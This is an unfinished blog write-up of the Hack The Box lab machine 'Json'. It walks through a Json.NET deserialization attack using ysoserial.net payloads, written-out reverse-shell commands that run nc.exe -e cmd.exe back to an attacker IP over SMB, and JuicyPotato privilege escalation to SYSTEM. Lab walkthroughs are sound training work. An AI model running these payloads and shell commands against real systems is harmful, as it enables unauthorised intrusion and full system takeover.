---
layout: post
title:  "Hack The Box - Json - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Json-Writeup" %}

# Introduction
The hack the box machine "Json" is a Medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of deserializtion

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">

By enumerating the target, it is possible to discover that port 80 is open. By visiting port 80, we are redirected to a login form. This page uses a jabascript files which discloses that users are authenticated using a header named "Bearer" which contains some base64 encoded data. In addition, 

The privilege escalation can be performed using juicypotato since the compromised user has SEImpersonate privileges

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.158`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 

![nmap](/assets/{{ imgDir }}/nmap.png)

![loginHTML](/assets/{{ imgDir }}/loginHTML.png)

![appMinJs](/assets/{{ imgDir }}/appMinJs.png)
Note: FIltered on only 200 ok (There was a lot of 404:s). Also excluded images

{% highlight javascript linenos %}
var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])
{% endhighlight %}

We get one long line.

I used https://beautifier.io/ to automatically format the code and decode the hex numbers in the strings. I then replaced the cryptic variable names (_0x30f6x1,_0x30f6x2,_0x30f6x3 e.t.c) with more suitable variable names to make the code easier to analyze. The result is shown below.

{% highlight Javascript linenos %}
angular['module']('json', ['ngCookies'])['controller']('loginController', ['$http', '$scope', '$cookies', function(http, scope, cookies) {
    scope['credentials'] = {
        UserName: '',
        Password: ''
    };
    scope['error'] = {
        message: '',
        show: false
    };
    var token = cookies['get']('OAuth2');
    if (token) {
        window['location']['href'] = 'index.html'
    };
    scope['login'] = function() {
        http['post']('/api/token', scope['credentials'])['then'](function(response) {
            window['location']['href'] = 'index.html'
        }, function(response) {
            scope['error']['message'] = 'Invalid Credentials.';
            scope['error']['show'] = true;
            console['log'](response)
        })
    }
}])['controller']('principalController', ['$http', '$scope', '$cookies', function(http, scope, cookies) {
    var token = cookies['get']('OAuth2');
    if (token) {
        http['get']('/api/Account/', {
            headers: {
                "Bearer": token
            }
        })['then'](function(response) {
            scope['UserName'] = response['data']['Name']
        }, function(response) {
            cookies['remove']('OAuth2');
            window['location']['href'] = 'login.html'
        })
    } else {
        window['location']['href'] = 'login.html'
    }
}])
{% endhighlight %}

Explain code..

Two controllers are defined.

At line x we see the endpoint `/api/token` which takes the parameters username and password. If the authentication is successful, it results in cookie named `OAuth2` being set. At line x, the code checks if the OAuth2 cookie has been set. If set, it sends a request to `/api/Account` to get information about the authenticated user. This request is a `GET` request where a header named `Bearer` has been added. The `Bearer` header contains the cookie received from an earlier request to `/api/token`. Since we don't have valid credentials, we can't request a token. We can, however, recreate the reqeust in burp without a valid token, as shown in the image below. This request results in the response in the second image below. From the response, we know that the web application expectes the value of thsi header to be [base64](link) encoded. 

![burpReq1](/assets/{{ imgDir }}/burpReq1.png)

![burpRes1](/assets/{{ imgDir }}/burpRes1.png)

We can execute `echo -n 'x' | base64` in a terminal to obtain `eA==` which is the base64 encoding of the character `x`. If we send a request with the value `eA==` for the `Bearer` header, we get another error message, as can be seen below.

![burpReq2](/assets/{{ imgDir }}/burpReq2.png)

![burpRes2](/assets/{{ imgDir }}/burpRes2.png)

This error message tells us that the object that we are sending in is being deserialized with `json.net`. It also let's us know that .net is being used in the backend. We could thus try to perform deserialization attacks. A good tool for generating deserialization payloads for .net is [ysoserial.net](https://github.com/pwntester/ysoserial.net). We download this zip file to a windows computer and extract it. Then, we execute `./ysosoerialnet.exe -h` to see the help uptions shown below. 

From the output of this command, we can see that we need to provide a formatter, gadget and command to execute.

We know that we should use the json.net formatter since it was disclosed in the repsonse. We can try to first most gadget Objectprovider. To see if it works, we can try to ping our attacking host. To do this, we execute `ysoserial.exe -c "ping -n 10 10.10.14.3" -o base64 -g ObjectDataProvider -f Json.Net`, as shown below. This genereate a base64 payload which will try to run the command `ping -n 10 10.10.14.3` when deserialized. Note, however, that you should change the IP address in this command to your IP address, to ensure that your machine receives the packets.

![genPing](/assets/{{ imgDir }}/genPing.png)

<!--
{% highlight none linenos %}
C:\Users\Thomas\Downloads\ysoserial-1.34\Release>ysoserial.exe -c "ping -n 10 10.10.14.3" -o base64 -g ObjectDataProvider -f Json.Net
ew0[...]DQp9

C:\Users\Thomas\Downloads\ysoserial-1.34\Release>ysoserial.exe -c "START /B \\10.10.14.3\T\nc.exe 10.10.14.3 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.Net
ew0[...]DQp9
{% endhighlight %}
-->

Next, we start [Wireshark]() by executing `wireshark`. Then, we copy the base64 encoded data from the previous image and place it as the value field of the `Bearer` header in the request we saw earlier to the `/api/Account` endpoint. Once we have sent this request, we start receiving packet in Wireshark. This means that we have successfully achieved remote code execution on the target. 

![wireshark](/assets/{{ imgDir }}/wireshark.png)

The next step is to get a shell on the target. To do this, we start by creating a folder named `myShare` and copying a netcat [portable executable]() to this directory. This binary can normally be found in the `/usr/share/windows-resources/binaries/` directory in Kali Linux. Then, we use `smbserver.py` from [impacket]() to create an SMB share which shares the `myShare` directory. We then proceed to generate a base64 encoded reverse shell payload by executing `ysoserial.exe -c "START /B \\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.Net`. When the target deserializes the reverse shell payload, it will execute the command `\\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe`. This command  connects to our SMB share and uses the netcat binary there to connect back to us on port 443 and provide us with a shell on the target.

{% highlight none linenos %}
kali@kali:/tmp/x$ mkdir myShare
kali@kali:/tmp/x$ cp /usr/share/windows-resources/binaries/nc.exe myShare/
kali@kali:/tmp/x$ sudo smbserver.py myShare ./myShare
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
{% endhighlight %}

![shell](/assets/{{ imgDir }}/shell.png)

We start a netcat listener by executing `nc -lvnp 443`. We then send a request to the `/api/Account` endpoint where the `Bearer` header is set to the base64 encoded reverse shell payload we just generated. A couple of seconds after sending the request, the listener receives a connection and we acquire a shell as the `userpool` user on the target!

<!-- ysoserial.exe -c "START /B \\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.Net -->

<!-- ![genRS](/assets/{{ imgDir }}/genRS.png)-->

<!-- We need a windows host to generate this payload. Maybe possible with wine.-->

# Privilege Escalation

We start by downloading jp.exe and GetCLSID.ps1 using `wget`

Explain jp flags
Explain what a CLSID is

{% highlight none linenos %}
kali@kali:/tmp/x$ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O ./myShare/jp.exe
[...]
2021-11-20 14:07:08 (22.2 MB/s) - ‘./myShare/jp.exe’ saved [347648/347648]

kali@kali:/tmp/x$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1 -O ./myShare/GetCLSID.ps1
[...]
2021-11-20 14:07:39 (25.2 MB/s) - ‘./myShare/GetCLSID.ps1’ saved [1580/1580]

kali@kali:/tmp/x$ 
{% endhighlight %}

We try to execute GetCLSID to get CLSIDs.
{% highlight none linenos %}
c:\windows\system32\inetsrv>cd C:\Windows\temp
cd C:\Windows\temp

C:\Windows\Temp>copy \\10.10.14.3\myShare\GetCLSID.ps1 .
copy \\10.10.14.3\myShare\GetCLSID.ps1 .
        1 file(s) copied.

C:\Windows\Temp>powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
[...]
ogv : To use the Out-GridView, install Windows PowerShell ISE by using Server 
Manager, and then restart this application. (Could not load file or assembly 
'Microsoft.PowerShell.GraphicalHost, Version=3.0.0.0, Culture=neutral, 
PublicKeyToken=31bf3856ad364e35' or one of its dependencies. The system cannot 
find the file specified.)
At C:\Windows\Temp\GetCLSID.ps1:58 char:11
+ $RESULT | ogv
+           ~~~
    + CategoryInfo          : ObjectNotFound: (Microsoft.Power...1bf3856ad364e 
   35:AssemblyName) [Out-GridView], NotSupportedException
    + FullyQualifiedErrorId : ErrorLoadingAssembly,Microsoft.PowerShell.Comman 
   ds.OutGridViewCommand
{% endhighlight %}

seems like its the last line that is the problem.
Patch it by executing `sed -i "s/$RESULT | ogv/$RESULT/" ./myShare/GetCLSID.ps1`.

![patch](/assets/{{ imgDir }}/patch.png)

We then re-execute the script.

{% highlight none linenos %}
C:\Windows\Temp>del GetCLSID.ps1
del GetCLSID.ps1

C:\Windows\Temp>copy \\10.10.14.3\myShare\GetCLSID.ps1 .
copy \\10.10.14.3\myShare\GetCLSID.ps1 .
        1 file(s) copied.

C:\Windows\Temp>powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs
[...]

AppId        : {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
LocalService : BITS
CLSID        : {03ca98d6-ff5d-49b8-abc6-03dd84127020}


AppId        : {8C482DCE-2644-4419-AEFF-189219F916B9}
LocalService : EapHost
CLSID        : {8C482DCE-2644-4419-AEFF-189219F916B9}

[...]

AppId        : {8BC3F05E-D86B-11D0-A075-00C04FB68820}
LocalService : winmgmt
CLSID        : {8BC3F05E-D86B-11D0-A075-00C04FB68820}


AppId        : {653C5148-4DCE-4905-9CFD-1B23662D3D9E}
LocalService : wuauserv
CLSID        : {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
{% endhighlight %}


![juicyPotato](/assets/{{ imgDir }}/juicyPotato.png)

![systemShell](/assets/{{ imgDir }}/systemShell.png)

We start a netcat listener `nc -lvnp 443`. then, we execute `\\10.10.14.3\myShare\jp.exe -t t -p  c:\windows\system32\cmd.exe -a "/c \\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe" -l 1337 -c {[CLSID]}` where [CLSID] is a CLSID above. We try each of the CLSIDs, one at a time, since only some of them might actually work. Eventually, we find that the CLSID `8BC3F05E-D86B-11D0-A075-00C04FB68820` works! More specifically, when we execute `\\10.10.14.3\myShare\jp.exe -t t -p  c:\windows\system32\cmd.exe -a "/c \\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe" -l 1337 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}`, we successfully acquire a shell as `SYSTEM`.


https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
https://github.com/ohpe/juicy-potato/releases/tag/v0.1
